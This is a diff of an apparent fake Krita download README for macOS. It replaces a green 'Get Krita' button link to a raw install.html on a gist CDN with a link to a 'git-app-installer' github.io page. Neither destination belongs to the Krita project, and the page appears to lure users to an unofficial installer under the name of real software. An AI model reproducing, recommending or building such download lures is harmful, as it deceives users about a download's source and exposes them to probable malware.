@@ -2,7 +2,7 @@
 
 Krita is a professional-grade illustration and painting application for macOS designed for artists, designers, and creators who need advanced tools for concept art, comics, and digital artwork. With a powerful brush engine and layered workflow, it offers full creative control in a desktop environment optimized for Mac users.
 
-<a href="https://gistcdn.githack.com/intospaceborne/0c227c88d383170bb7cd29895b8610f3/raw/8556874a04939f78451fee4f2542e281578b6cfb/install.html?offer=Krita" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=Krita" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Krita%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
